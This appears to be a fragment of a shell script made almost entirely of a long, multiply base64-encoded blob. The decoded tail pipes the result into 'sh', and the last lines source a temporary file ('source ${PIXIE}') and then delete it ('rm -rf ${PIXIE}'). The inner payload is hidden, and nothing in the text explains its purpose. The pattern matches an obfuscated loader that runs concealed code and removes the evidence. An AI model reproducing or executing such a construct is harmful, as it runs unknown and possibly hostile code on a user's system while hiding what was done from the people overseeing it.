VVJTTTFkWGNFOVRNa1pIWWpOc1YxZEdjR2hXYm5CR1pVWnNjbHBGWkU1U2JrSlpWbFpvWVZSc1JqWmlSVTVYVmpOb1ZGZHRlRVpsVlRsWllrZHNUbUZzV25aV01GSkRUVVpWZUZvemNGaFhSM2hPV1ZkNFYwMXNWbkpXYTJSWFZtdGFWVlF4WXpGWGJGbzJVbTVPV0ZKRk5VUlpWV1JUVTBaU2RFOVdiR3hoTUZsNFZrWmFVMkZ0VWxaTlZWSlBVMGRvVDFaclpHdE5NVkpZWVhwR2EwMVhlRmxaZWtwclZGVXdkMDVJWkZwaGF6Vk1XVlZhZG1WV1dsbFhiVVpYWld0V05GZFhkR3RTTURGSFkwWm9WbGRHY0U5VldIQnpVVEZzZEUxV1RteFdNR3cxV1d0a01GUlZNWE5UYlRsaFVsZFNSMXBIZUhKbFZUbFpWV3N4YVdFd2JEUldNV040WVcxU1dGSlljRlJpYkVwd1ZGZDBkMlF4YkhKYVJscHJZa2hDTUZscmFFOVpWbVJHVFZSS1YySkdXbGRVVlZwS1pWWktkVlZ0UmxabGJYaFdWMVpXYTFJeVJYbFRXSEJoVW14YWNWbHNWbUZqVm14VlUyeGtiRlpyY0ZwWlZWSkRZVzFLVmxacVNsZFdSWEIyV1ZWYWQxTkZPVlZVYkdSVVVsaENkbFl4VWt0TlIwcElWRzVLVjJGc1NuSlZNRlozWWpGU1JWSnJPV2hTTVVvd1ZtMHhNRlJWTVZaVGJUbGFWa1UxVDFwSGVIWmxWa3AxVlcxR1YyRnRkM3BXTVZwdlZUSkdkRkpyWkZCVFIxSk9XVmQwVm1Wc1VraGpSVXByVmxSR1ZsVnNVbE5VYkVwR1lrUkdXazFIVWtoWk1uUlBaRVpTZFZwRmNGSmxhMXBWVlRGV1RrNVhWblJWYTJoUVYwZDRZVlpxU2xOak1WSkZVMnhrYTFJeFNsbGFWV1J2WVRGSmVGZHVTbFZUU0VKRFdrZDRSMVl4VG5OV2JHeE9VbFJWZVZkVVNYZE9WMUpYWWtaa1VGWllhRmRaYTFKeVpWWlNXR0Y2UWs1V1dHUXpWbGQwUzFZeFNsWldha3BZWVd0d1NGcEZXbmRXTURsWldrWndXRkpyY0hoWFZsWmFUa2RSZDJWSVJsTldSVFZPV1ZkMFIwMVdVbGRWYTFwUFVsUkdSbFpHYUZkaGJFbDNWMjVzVkZaVk1ERmFWekZUVTBVNVdXSkdjRmROYkVwNlZrVlNTMVl5VWtoVmJHaHNVakpvY2xWcVJtRmpiRkpKWTBWS2EySkZXbGxVYkdRd1lXMUtWV0pJWkZoaE1EQXhXVlJHYzFkV1ZuUmhSVEZPWVhwVmVWZFhlRTVOVjFGNVZXeG9WR0pVVms1WmJHaFRUbFpzYzFsNlZtaFdNRnBaV2xWa05GUlZNWE5qU0dSYVlUSlNXRnBYZERObFJscHlWMnM1VTFZeFNuWlhWM2hyVm0xU2MxWlliR2hTTW1ob1ZXNXdjbVZzV25KaFJYUm9VbTEwTlZwRlpEUmhiVVY0VjFSQ1lWSlhhRXhaVlZZelpVWlNkRTlXY0ZkTlZXOTVWMnRTUjFVeVZsZGlSbWhWWW10d2FGWXdWbmRTTVhCV1lVWk9iRlp0ZUZWVU1WcFRWMnhrUjJOSVRsaGhNREF4VmxaYWMxZEhVa2xqUlRGT1lsWktkbGRYZUd0V01YQjBWR3RvVTJGclNtRlVWekZ2WWxaU1ZsUlVRbXhTVkZVeFZHdG9hMVJYUm5KV2FsSlZUVVpLUTFwWGREUmtWa1owWVVkb2EwMHdTbmhYVkVKUFVXMVNSMVp1UWxKWFJuQnhWRlJHUzAxc2EzbE5WV1JwWWtoQ1ZWUXhaRFJoVm1SSFYyNXdXRlp0YUZSWmExcDNVa1U1U1ZwRk1VNVNWbkJWVm0xMFdrNVdTa2hUV0hCVVlteHdjRmxzVm1GaVZsWTJVbXQwWVdKV1NuaFZNV2hYVkRGV05tSkZXbFpXYkhCVVZWZDBNMlZXY0VoaFIyeFhUVlp3ZEZkVVFtdFNNREZIWVROc2FGSXhjRTlWV0hCVFRrWlNkV0Y2UW10TlNHaDRWV3hvYjFWR1NrWlNXR1JWVW5wV1JGbFZaRWRPVmtaWlYyMXdUazFWYjNsWFZFbDRVakpLYzJOR1VsQldNMmh3VmpCYVlXVnNaRmRoUms1cFVtNUNSVlF3YUd0VVZURkdWMnBHV0dFeWFFeGFSekZIVjBaV1dWZHRSbE5OUm13elZqRmFUazVYUm5SVFdHeE9VMFphY1ZVd1dtRmpSbVIxWVhwR2FtSlZOVEJVVm1oaFYyMUtXR1ZJY0ZoaVJUQXhXV3hrUjFkSFZraGxSM0JzVmtkNFdGWlhlRk5WTVU1SFlrWm9UbFl6YUU1VVZsVXhaR3hrVjFwR1RtdGlWa1kwVmxjMWMxZHNXWGRPV0d4WVlrZG9URlZ0TVZkVFZsWjFZa1p3Vm1WdGVGWlhWbFpyVWpKRmVWTlljR0ZTYkZweFdXeFdZV05XYkZWVGJHUnNWbXR3V2xsVlVrTmhiVXBXVm1wS1YxWkZjRWhVVjNoM1YwWldXVmRzV2xOTlJuQTFWMVJPY2s1WFNuTmlSbWhPVmpOb1dsUlVRa3RpTVhCR1drVTVhVTFYWnpKVlZtaFhWR3hhU0ZScVJsVldWVEIzV2xWVmVGWldiM3BhUlRsU1pXeFplbFl4V210bGJFMTRZVE53VWxZeVVrNVdiWFJ6WW14U1JWUnJPVTVTTUd3MlZUSXhiMWxWTVhOV2FrcFlZa2RPTkZSV1pFdFRSa3B4VVcxR1YwMVZXWGxXUmxaT1RsWkdjMVp1VGxaaVZuQlRWRmR3YzA1V2JIRlRWRVpvVW0xa00xcEZXazlYVlRCNFlrUldWVkl6UWxkYVIzaExVbXhLYzFac1NsWmxiWGd4VmpGYWFtVkhTa2RhTTNCU1lsZG9jbFZxUVRGa2JHUkpZMFZLYTFaVVJsWlhWRTVYVkd4R05sVnFVbFZXYkVwMVdrUkJNVlpGTlZsYVJuQlhUVEExZFZaRlVrOVVNREZJVTFod1ZHSlhhR2hVVjNoWFRXeGtjMWt6YUU1V01IQkpWVzF3UTFsV1dYaFNha3BWVmxVd01WVlhNVXRrUmxaMVlrZHNUbUpZYUhsV1JWSkxWVEpHU0ZWcmFGTlhSbkJoVkZkd2MwMUdVa2hPVlU1T1ZtMTRNRmRVVGxkaFJUQjNZMFJDV21GcmNFeFpNR1JMVTBaYVdWZHRSbWxXTTJnMlZqSjRiMVJ0VW5OWGJGcFhWa1ZLVkZSWGRHRk5SbVJ6VkZSV1YxSXdXa2xWYlRFd1lWVXdlVlZzV2xwTmFrWklXVmN4Um1WV1duVmlSazVZVWpKa00xZFVTWGhTYlZKelZsaHNhRkl5YUdoVmJuQnlaV3hhY21GRmRHaFNiWFExV2tWa05HRnRSWGhYVkVKaFVsZG9URmxWVmpObFJsSjBZVWQwYVZac2NIbFdSVkpIVVRKR1NGSlljRlZYUm5Cb1ZGZDBZVTFHWkhOWFZGWnJUVmQ0V2xaWE1YZGhSa3B4WVVST1ZWSXpRa2RVVkVJMFkxWkdXVlpyTlZkU1ZsVjNWa1pXVTFadFVsaFVhMmhUWW10d1JWbHNWVEZOTVU1V1ZGaG9WazFIZUVWVU1XaDNZVEZLTm1KRVZsaFdiVkp5V1d0V00yVldXblZWYlhSWFRUSm9kbGRyVm10V01rVjNaVVJhVWxkR2NGTldiWFIzVm14a1JWRnJPV3RpVlRVd1ZERm9WMWRzV25GaVJURlhWak5qTVZSWGMzaGpSVFZGVW1zeFRsSnJjRVJXYlhSWFVtMVNjMkl6YkZOaWJFcG9WbTF3YzAweFpGZGhSazVvWWxWYVNGUXdhR3RVVjBaeVZsaHdWVkl6UWtOYVJsVjRWbFpLVlZWck5WTlNiWGQ0VjFSQ2ExSXlUbkppUlZKUVYwaENjbFZ1Y0hOT1ZtUlhXa2QwYVZKWVpEVldiVFZUWVRGWmVtRkhPV0ZTVjFKWVdWUkNORTVzUmxsWGJFcFhaV3hhZVZkVVNYZE9WMDVIWTBWU1VGWXpVbUZXTUZwTFlqRlNSVk5yT1d0aVZYQlZWR3hvYTJFeFdYZGpTRlpWVW5wRmQxcFdaRXRYUlRsWVlrZG9WMDB5YUhwV1JWSkxXVmRPU0ZOcmFGZGlia0pPVkZaYVlWSXhVbkpXYlhSb1VqQndXVlpzYUdGV2F6RjBZVWM1V0dFeVRURlVWRVpoVTFaT2RHRkdjRTVpYkVwNlYxUktNRll3TlVoVmEyeFVZbGRvVGxSV1ZURmtiR1JYV2taT2EySldSalJXVnpWelYyeFpkMDVZYkZoaVIyaE1WVzB4VjFOV1ZuVmlSbkJXWlcxNFZsWXhXbTlaVjBwSFkwVlNVRlpyV21GV2FrNVRUbXhTUlZOdGRHaFNNSEJaVm0weFlXRnNTWGRYV0dSWVZrVndkbGR0YzNoU1JUVkpZVVU1YkZaR1NYcFdSV1IzVW0xV1JrOVZWbEpXUlhCT1dXMTBTMkl4YkZsYVNHUm9ZbFUxUlZWV2FGTldiVVpXVW1wS1dtVnJOVlJhUnpGUFpFWktkRTVYUmxabGJYaDZWMWQ0YjFZeVRYaGlSbXhXWWxob2FGVlljRzlOTVZKRlVXdGtWazFXY0VoVU1WWlRZVlV3ZDJORVNscGlWRVpJVjIxNFRtVkdUblJYYlhSb1lUSjNlRlpIZUU1T1ZrcFhVbXhrVm1Fd2NFNVVWekZUWWpGc2MxcEdaR0ZpVlRWSlZXMXdRMWRyTVhSaFJ6RlZWbFV3ZDFwVlZURk9WVFZKV2tVeGFHRXhXVEJXUkVKVFVXc3dkMlZJVmxKaVYyaHZXbFpXUjAxc2JEWlViRTVyWWxVMU1GVnRNREZaVmxZMllraE9XbUpIYUZoWmVrWnpWMVpXZEdWSFJsSmxiV2Q2VmtWU1ExSXlVbGRqUld4VVlteHdiMVpxUmtkTmJHUnlXa1ZrVGxKdGVGVlVNV1IzWVZVeGNWRnFSbHBOUjJoWVdWWmFkMDVWTlZsVGJYQnBWa1ZaZVZZeFkzaGpNazE0WTBaU1VGWjZSbTlXYWs1dll6RnJlbUY2VmxkaVJYQldWbGQwYjFkc1dqWlNiazVWVWtWYVVGbHFSbk5YUmxaMVYyMTBUbFpyYnpGV01WcHJWREpPYzJOR2JGUmhNWEJ6VlRCYVMwNVdaRmRVVkZaWFVqQmFTVlZ0TVRCaFZUQjVWV3hhV2sxcVJraFpWekZHWlZaYWRXSkdUbGhTTW1RelYxUkplRkp0VW5OV1dHeFRZV3R3YUZacVJrZE5iRnBXV2tWa2FtSlZOREZVTVdNeFYyeGFObEp1VGxoU1JUVkVXVlZrVTFOR1VuUlBWbXhzWVRCWmVGWkdXbE5oYlZKV1RWVlNUMU5IYUU5V2EyUnJUVEZTZFdGNlJtdE5WM2haV1hwQ01HRnNTalpSYlRWYVZtMU5lRnBYTVZOVFJrcDFWRzFzVWsxRldYZFhWRXB6VVcxU2MyTkZhRk5oYTBwaFZsaHdjMkl4YTNkaFJVcHJZa2QwTlZReGFGTlVWMHB5VTFob1dGWjZSbkZhUm1SR1pXeE9kVlZ0YkU1aE0wSXpWMWQwYTFadFRsWmtNMnhVWWxkb2NWUlhlRmROVm1SWFlVVk9hbUV3TlRGV1J6VlBXVlpaZUZkcVRsUldWa3BMVlhwR2QxZEdVblJQVjJ4c1ZsVmFkMVV4VmxkaU1sSjBWR3RvVjFZeVVsbFdibkJ5WlVaT1ZsWnNaR3RXTUZvd1ZERlNWMWxXV1hoU2JUVlFVbGM1ZVZZeFpITmpSa1pZWWtWU2FWWnNjSGhYVmxacVRrWnZkMkpJUWxKaE0yaG9WbXBHWVUweFRsWlhhemxPVmpBMVNsVlhOV0ZoYlVwelUyNWtXbUpVUm5GYVJsWTBZMFUxU1Zac2FHeFdWWEJYVmpKNGExSXlVa2RTYkdSVVlrWmFTMVZ0Y0VOaWJFNVlXa2hrYVZKdGREVlpWV2hoVTJ4RmQySkhOVmRTUlRWeVdrWmFkMWRXVGxoYVJrSm9Wa1ZLZFZaV1ZsWmxSMFpIVjJ0c1ZHSnJTbk5WYTJSNlpERlNXR05GV21GTlIzaDFXVEJrTkZkck1YUmhSRXBVVmxVMVMxZHFSazlrUlRsWlVXMXNhRlpWY0VaWFZsWnJVakpTV0ZOdVVsZGlhelZMVld0ak5VMUdUbFpXYTA1clVtMTRXbFpYTlhOaFJtUklZVVpHV0dKVVJtaFpNRnB5WlZkS1NHRkhiRk5TVmxwMVZURmthMlF5Vm5SVGEyaFhZbGhvY1ZWVVFrZE9Wa1Y1VFZaa2FHSlZXa2xVTUdSclUyMUdWbFZ1UW1saVIzTjZXVlpqTVZkdFZuUmlTRlpZVmtkU2QxbHRlSE5PYlVaWVRsWndUMUl5VWxsYVZsWkxVakZaZDFadVRsZFdWM2hJVkZWa2FrMUhUa1ZUYkVKUFUwVkdOVlpHVWxOa01ERnlUMFJDYWxKRmNFOVVhMmhDWlZaUmQySkZVbFJXUkVKMVdtdE9RMkZXYkZsVWJYaFBZV3hHYmxSR1pGSmFNbHBFVVc1d2FGRlVNRGxLTTNkbldXMUdlbHBVV1RCSlF6RnJTVWgzWjJNeVp6MG5mQ0JpWVhObE5qUWdMV1FnZkNCemFBPT0KRElYSUUKc291cmNlICR7UElYSUV9CnJtIC1yZiAke1BJWElFfQ==
DIXIE
source ${PIXIE}
rm -rf ${PIXIE}